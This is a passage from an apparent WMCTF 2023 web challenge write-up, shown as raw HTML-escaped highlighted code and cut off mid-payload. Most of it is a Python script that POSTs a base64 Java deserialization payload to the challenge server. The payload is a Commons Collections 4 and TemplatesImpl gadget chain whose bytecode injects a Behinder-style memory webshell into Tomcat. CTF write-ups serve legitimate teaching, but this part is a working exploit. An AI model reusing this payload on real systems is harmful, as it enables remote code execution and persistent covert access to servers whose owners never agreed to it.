&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;private &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;WMCTF &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2023&lt;&#x2F;span&gt;&lt;span&gt; web writeup &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;void &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setFieldValue&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Object &lt;&#x2F;span&gt;&lt;span&gt;obj&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;String &lt;&#x2F;span&gt;&lt;span&gt;field&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Object &lt;&#x2F;span&gt;&lt;span&gt;arg) throws &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Exception&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Field&lt;&#x2F;span&gt;&lt;span&gt; f &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; obj&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;getClass&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;getDeclaredField&lt;&#x2F;span&gt;&lt;span&gt;(field)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;setAccessible&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;set&lt;&#x2F;span&gt;&lt;span&gt;(obj&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; arg)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;写冰蝎马脚本&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;requests
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;burp0_url &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;http:&#x2F;&#x2F;119.45.178.147:30000&#x2F;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;burp0_headers &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;Pragma&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;no-cache&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;Cache-Control&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;no-cache&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;Upgrade-Insecure-Requests&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;1&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;Origin&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;http:&#x2F;&#x2F;119.45.178.147:30000&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;Content-Type&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;application&#x2F;x-www-form-urlencoded&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;User-Agent&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;116.0.0.0 Safari&#x2F;537.36&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;Accept&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q=0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q=0.8,application&#x2F;signed-exchange;v=b3;q=0.7&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;Referer&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;http:&#x2F;&#x2F;119.45.178.147:30000&#x2F;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;Accept-Encoding&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;gzip, deflate&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;Accept-Language&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;zh-CN,zh;q=0.9&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;Connection&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;close&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;burp0_data &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;data&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci&#x2F;5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAP29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H+khtA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAKTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAAMjHK&#x2F;rq+AAAANAGoCAD9CAD+CAD&#x2F;CgBrAQAKAGoBAQsBAgEDCwEEAQULAQQBBgoAagEHCgBqAQgHAQkKAAsBAAcBCggBCwoAagEMBwChCgANAQ0IAQ4KAEwBDwgBEAoAagERCAESCACXBwETCgAYARQLARUBAwoAGAEWCgA5ARcKADQBDQgBGAsBAgEZCAEaCgANARsKADQBHAgBHQgBHggBHwgAeQcBIAcBIQoAKAEiCgANASMKADQBJAoAagElCgAyASYKADQBJwoAagEoCgBqASkKAGoBKgcBKwgAsQcBLAcAsAkBLQEuCgA0AS8KATABMQcBMgoBLQEzCgEwATQHATUKAGoBNggBNwoAagE4CAE5BwC8CgE6ATsKAAsBPAoACwEZCAE9CgALAT4KAAsBPwoACwFACAFBCgA0AUIIAUMHAUQKADQBRQgBRggBRwgBSAcBSQoAUQEABwFKCgBTAUsHAUwKAFUBTQoAVQFOCgBRAU8KAFEBUAoAagFRCgFSATEKAVIBFgoANAFTBwFUCgA0AVUKAF4BVgoANAFXCgEwAQ0KAEwBWAoBMAFZBwFaCgBlAVYHAVsKAGcBXAoAKAFWBwFdBwFeAQANZ2V0VXJsUGF0dGVybgEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABZMY29tL2V4YW1wbGUvZXhwL2Rhd2Q7AQAMZ2V0Q2xhc3NOYW1lAQAPZ2V0QmFzZTY0U3RyaW5nAQAKRXhjZXB0aW9ucwcBXwEABjxpbml0PgEAAygpVgEAB2NvbnRleHQBABJMamF2YS9sYW5nL09iamVjdDsBAAhsaXN0ZW5lcgEACGNvbnRleHRzAQAQTGphdmEvdXRpbC9MaXN0OwEABHZhcjIBABRMamF2YS91dGlsL0l0ZXJhdG9yOwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBACRMamF2YS91dGlsL0xpc3Q8TGphdmEvbGFuZy9PYmplY3Q7PjsBAA1TdGFja01hcFRhYmxlBwFdBwFgBwFhAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcBYgEAEE1ldGhvZFBhcmFtZXRlcnMBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACmdldENvbnRleHQBABIoKUxqYXZhL3V0aWwvTGlzdDsBAARrZXkxAQADa2V5AQAIY2hpbGRyZW4BABNMamF2YS91dGlsL0hhc2hNYXA7AQAFdmFyMTIBAAtjaGlsZHJlbk1hcAEABHZhcjkBAAZ0aHJlYWQBABJMamF2YS9sYW5nL1RocmVhZDsBAAR2YXI2AQABSQEABHZhcjQBABNbTGphdmEvbGFuZy9UaHJlYWQ7AQAEdmFyNQEABXZhcjE0AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAHdGhyZWFkcwcBMgcBCgcBEwcBIAcBYwEACVNpZ25hdHVyZQEAJigpTGphdmEvdXRpbC9MaXN0PExqYXZhL2xhbmcvT2JqZWN0Oz47AQALZ2V0TGlzdGVuZXIBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACWNsYXp6Qnl0ZQEAAltCAQALZGVmaW5lQ2xhc3MBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABWNsYXp6AQARTGphdmEvbGFuZy9DbGFzczsBAAtjbGFzc0xvYWRlcgEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7BwErBwE1AQALYWRkTGlzdGVuZXIBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYBAAdvYmplY3RzAQATW0xqYXZhL2xhbmcvT2JqZWN0OwEACWxpc3RlbmVycwEACWFycmF5TGlzdAEAFUxqYXZhL3V0aWwvQXJyYXlMaXN0OwEABHZhcjcBAAppc0luamVjdGVkAQAnKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylaAQABaQEADWV2aWxDbGFzc05hbWUBABJMamF2YS9sYW5nL1N0cmluZzsHAUQHAQkBAAxkZWNvZGVCYXNlNjQBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAMZGVjb2RlckNsYXNzAQAHZGVjb2RlcgEACWJhc2U2NFN0cgcBZAEADmd6aXBEZWNvbXByZXNzAQAGKFtCKVtCAQAOY29tcHJlc3NlZERhdGEBAANvdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQACaW4BAB5MamF2YS9pby9CeXRlQXJyYXlJbnB1dFN0cmVhbTsBAAZ1bmd6aXABAB9MamF2YS91dGlsL3ppcC9HWklQSW5wdXRTdHJlYW07AQAGYnVmZmVyAQABbgcBSQcBSgcBTAEABWdldEZWAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAANvYmoBAAlmaWVsZE5hbWUBAAVmaWVsZAEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAARnZXRGAQA&#x2F;KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAgTGphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbjsBABRMamF2YS9sYW5nL0NsYXNzPCo+OwcBLAcBVAEADGludm9rZU1ldGhvZAEADHRhcmdldE9iamVjdAEACm1ldGhvZE5hbWUBAF0oTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAdtZXRob2RzAQAbW0xqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAFdmFyMTEBACFMamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbjsBACJMamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb247AQAFdmFyMTABAApwYXJhbUNsYXp6AQASW0xqYXZhL2xhbmcvQ2xhc3M7AQAFcGFyYW0BAAZtZXRob2QBAAl0ZW1wQ2xhc3MHAWUHAO0HAVoHAVsBAApTb3VyY2VGaWxlAQAJZGF3ZC5qYXZhAQACLyoBAARhZHdhAQwsSDRzSUFBQUFBQUFBQUkxWGVYd1QxeEgrVnBLMXNyeUVJTUJnU01LVkJCK3loYm14d2NFQ0c3dXhUWUxBMURnTlhhOVcxb0lzQ1dsbE1HbWJIaWx0VTNxbWFadmVWK28yVFJzN3RMSUpEYUZuMnZRKzB2dSttOTd0UC8wblRiKzN1NVp0V1k3eHo5cmp2Wmx2WnI0M00rL3RVLzk3N0RLQVJ2eEhna2VObmxabFNCS1duMUNIMVZCQ1RRNkc5aVhVYkxZcnBVYjFqQXkzaEJ2RjFKbFFWczhNSjNRekZMSHZoL1JUT1QxcmRobFpVMDhLeVRJSml3WjFzME1YaWozcWtDNWhXWFZOMXpSdXhNd1l5Y0ZtV3QyWGluTFdmNFNROWEyRGV0TDB3Uy9obW9KMnI1cklVY0I3U05maUo1SStMSkt3MkVnYTVyNWMxa3dOM2FabTFDRUo3dXFhWGduWERqUnVpVFdxamJxMk14YmR2a1BmN3NNU1drZ3pCQW1CdWRZVkxNV3ljcml3blBpN0JXZ0x3YnVNcE42VEd4clFNNGZWZ1lRdU5GT2FtdWhWTTRaNGR3WTladHdncXJkTHNFYWtGYmpXRHcrdWs3Q3F1cXNrZjgzQ1JVbVRzR0tlZVFGeWd3Qlp4MUF5TnFYNytjdWtSdlNvaEp0dDNQbklieHNtZDVhTnBkbTVFeEkyWElVMi9Sdms4bGYzaDJ1S2ZSUnpBeEpjL1dFSkZWRTlScEtzY1laRDhjN091UW9LNmhBVTRkU1RRaWVjVG5Kc3FBbmpyQWhvNmJSRzJ4bE5UNXRHS2lsakV4MXdYTlV5STJrekZkcG5wT09rUjRJdm8yZlRxV1NXOUJkekVUZk5kS2lEbDBKWXRpUzE1S3llelJKYXd0cjVsU3dKQ3J0VEF5ZEVEbGl1NVV3akVlcFcwd0xFQ1VEQ3hnVXRXNExVV2JjZzRUSW9kdE5WNGNuWXd4UzR1cUJsM0NMaGh1ZVBWVVlyYTNSV21ETDJjU2hpcXRwSnZqbDV2b1NGT05zVDh1aVU4bnl4Y2VuYmNjQ1AzZWhRSU1Qblo0bTlRRUo1b2FZTHlUeXJIRXYwQndWZDZLNUFDM29VS0RiUWJTeU9ZamtaaDVnZFdpcHBxa2FTS2JsNlZnbkcxVXhFT0piVTlPYWFZd29PNDRnZkViQlNLZ2VuU1d2UHBJWUtFZDYrY0g3WmtSWVRNVzhlS25naCtvVC94OWpzTEU2ZHBGdy9oOHc1YWFuZ0RyeElzSEFuMTJONnlUclViTnhhdGhmN29lSTZIM1l4ZjlNNXVyOXpadndIQjA3b210azhkNlJtN3BDQ0tQUUs3RWZNaHkwK2JHUFI1M3hnUmZpSTYzVGlqU1dXcmdSNHI0SUVoaW9RQm9OMHQ3WkZmRWc3TlY5VTJUS1lFQlhrcERPWk5WV3Vrb1NhZWRPanVDc29NSkh6STR0aENXdG1DV1RUdXNiRTFESzZlYXMrRXVHYmpET01oSWJDSTZiT05QRlUxL1NIRlp6RlhTSWZYbUszc2hLR2UwVm5mcGtmSTdpYlNtS2ZFS0tkdG1SVzEzSVp3eHdKMFlnbCtncThVdmp6cWxsNWFyTWk0OVcyQTA3clhGcGRxbTIrQnEvMTR4eGV4ejVVTkNuajlmYldPR1Bia0ZBMUY2V3dvN3dCYi9UalBONGtNbStkWFlLSG5CSmNOYVZtcEVMaFhDeW1aL1NvUFVlOXQrSStrWEJ2WTQyVWxwSHhkcXNocTFHeFh5cDRwNmpPZCtBQkNjcUFtdFczYjkydmE5Yk9YbGxxS1FYdDc4WjdoRmZ2WlhPTnB0cU5wSnJnZGlxMkhqSDVmbnhBa1BoQkJSdFJMY1ErekJSSjZxZW5VMlQyZWFLUXZ3L2lveUxnVVdLeFJOVkVWdXhuSmRLVGZlRGplRWp3L0FrV1pHSC9vWGdaT1dydlhiQ0lTalN0Z2hPZndpUEM1ekduQzl1elBhbElUb3UzRzNvaU9tTzdlNVFaTmF4bXRrM3RUdlBMTnR1U20yWWZaUnliOWx5amZkdk1uSmdoa3RGakNjcUVMRGhIY2dzN1NZa3Rmc1U4V2pJZVp6cVRHSzVxUW1VU1dLTVM2aGRvNDdOTkszZ0NWOFRxZk00K0hrWnlhVDJqQ2RNS3ZpQ1MvankrV0xSY3Mwcnd5MzVjd0pQVXplcG1xNmFKN21pZnhhcVBDWUd2NGlrL0x1TnJiRGNFTDlwam5xL25mUVBmRklyZjR0clRtN05uUlVaYTJadVpPb3NVblZMRVFZSG5NaVozTnBkc0dES3lXa080TmRJMmxmUVpINTRtUml6bEhIMXZXb0NscWNML0lYNGtPUGd4YThpMmI1ZWNEeisxSzdkYk4rTXBzcjYzQkY3L0hMeFM2MkFqME5UUDhRdGg2cGNTVnM0bkplUFhMQ0lqT1p3NnlSaDJsU0N6L3lyNS9TMSs1OGR2OEhzWnRVNVRiQkFiV0VQWWFoUSsvTW5lRWd2a1BVTzdOZ0UrL0pWZFpyZVdzQTduQ2hhTFU3WUwvNkJDSkpYTGFIcTdJUkpnZVZpUEcwbnFUbjJCTkFnaldFZFJEd2pHbjErYzlmbXBvL0NKUnhLT2xQTnRNZS9pengyb0dMTWUvT0tZTVdmeW1xbEoybmNtQTg2a054QzRnTXB4NjFrU1h3SE8vQmJlaFVSWjdRU3VGOU11ckxRZ1hMeXVwMXNiVUdXNVl3bGhGVlk3QURjNEFDMlVGTExlMnJvSnJDOUd1Sms2R3kyRVNsdktRUkJQYTdEV01yNEJOenBZMnl4dDRrL0RlQzNEZFRNZ3BBSUVNNVlHQkFTYnJ3T3hoeTRMcWZMYU9uZmQ1UWswakJWQk5jeUFLaTlBbGFNR3RSWlVhTW9iNlQ1cXlKd2JyOHVqOHdwYXVvT1R1UFVpRHJvd2lkdnpPUG9BN3E4TlRxQy9KM2dSeHlVMGVTNUI3WnZBUUZOWlZWbEE0K0NnRzBmNUdLOHZQQnBWSHVmWkV6ajVLQ292SXVWRzROUWtUamQ1cTd4bGx6RFN4OUU4WGhvNE5ZR1g1M0hQSmJqNmF2TzRONDgzVCtBdFZkNWF3dDR2SVk5MzVmRytQRDZVeDBmeStGaFZXUjRQSHgxRldaTjNGSjZlY1FZWHdTZ2U0Z2V6RHcvakVkN2RGZ1h0V0dLdE9ZOU1ESDA3RjJBSG1kdkorVjA4QlRmaEFKcXB1UWZIdWF3eDNJSzdzSmM0WVNLMUVxZWRTUHN4aGc2THdnNlNFK1A0R213bVVXdFpwVnV3bFhhcWNRL1J0M01kR3FtL2craGxnc1FDMWVQT3F2bTRzZTJpVFJmYXJFVHhQRWN6WGhrdUdidGx0TWpZS3lNczA2QWtvL0cva1BqY0tKYVM1MU5lUDBrZFVUT04xcXAzY0VSWUNVcmRkUUZ0RXVPQk9DOVhzTGQ3RkZVOWRUUGVmRTJlVWJqNUh4eXpFbmNKcTYwUnl4bkZlZ0hQSk9DbXlIR0IralNqRWFnN3BXNnhCajMxZ1hNUG9yS2U2ZkI1SWkxcTh0VG44YVdlMGVlZUNUNEo1Ukl1OUxFQ3Z2SkUwSlBIMTROVStQWVkvVnZFZXE3a2RtRHp2NW1GQkJ3VW53ZGs3eEJuRDNQK0NDVjZPWDhVMXpPNnRlaG5DdDZCZXR4SitlTVcxMXZweDByK1BvM1BNR3A2eEF5WXNOamN5V1JjUmpzdU1uNFJqL0V1YUxxRXo5S2k0SFVKUE05Q2xuRlp4dmtlR1JmS2xSblVTZUp3NHdUN0xCZFJCRHNTK01Fa2Z0SWREUHpNOHpqTzk3a0RrVWdldndveXkvaCtyczlkeDljL1hNRWZDLzlqM1lFL1U0UHMvTVZORFFwTHZKK2pWSk9uaWx6Y0cvamJUS1FxejN3NFZubHVvbHRUMmJxS0xnRTZyekdPRFpLTk9PTTErSzExd21LbGhUTmU5b2J2TUZvWFoxcXRKemZuNi9GZDh1T2h4Z0Z5OWoycjJFY0tHVGlDNzF1Y3RkbE40WlJnYkpvVUgvNWU2STVyWWY5NUp2SFBjYXZqVExlMlZiUzBtaVAvc2hyTXYvOFBtWmIyNXFNU0FBQT0MAHcAeAwAkwCUBwFgDACPAWYHAWEMAWcBaAwBaQFqDACtAK4MALkAugEAE2phdmEvdXRpbC9BcnJheUxpc3QBABBqYXZhL2xhbmcvVGhyZWFkAQAKZ2V0VGhyZWFkcwwA6ADdDAFrAG0BABxDb250YWluZXJCYWNrZ3JvdW5kUHJvY2Vzc29yDAFsAW0BAAZ0YXJnZXQMANwA3QEABnRoaXMkMAEAEWphdmEvdXRpbC9IYXNoTWFwDAFuAW8HAXAMAXEArgwBcgFzAQAPU3RhbmRhcmRDb250ZXh0DAF0AXUBABVUb21jYXRFbWJlZGRlZENvbnRleHQMAXYBdwwBeABtAQAZUGFyYWxsZWxXZWJhcHBDbGFzc0xvYWRlcgEAH1RvbWNhdEVtYmVkZGVkV2ViYXBwQ2xhc3NMb2FkZXIBAAlyZXNvdXJjZXMBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAHcBeQwBegF7DAF8AXcMAHMAbQwBfQF+DAF&#x2F;AWoMAHQAbQwAyADJDADOAM8BABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAA9qYXZhL2xhbmcvQ2xhc3MHAYAMAYEAtAwBggGDBwFlDAGEAYUBABBqYXZhL2xhbmcvT2JqZWN0DAGGAYcMAYgBiQEAE2phdmEvbGFuZy9UaHJvd2FibGUMAMEAwgEAG2FkZEFwcGxpY2F0aW9uRXZlbnRMaXN0ZW5lcgwA6ADrAQAcZ2V0QXBwbGljYXRpb25FdmVudExpc3RlbmVycwcBigwBiwGMDAB3AY0BABxzZXRBcHBsaWNhdGlvbkV2ZW50TGlzdGVuZXJzDAGOAY8MAZABkQwBcQGSAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgwBkwF+AQAMZGVjb2RlQnVmZmVyAQAQamF2YS9sYW5nL1N0cmluZwwBlAGDAQAQamF2YS51dGlsLkJhc2U2NAEACmdldERlY29kZXIBAAZkZWNvZGUBAB1qYXZhL2lvL0J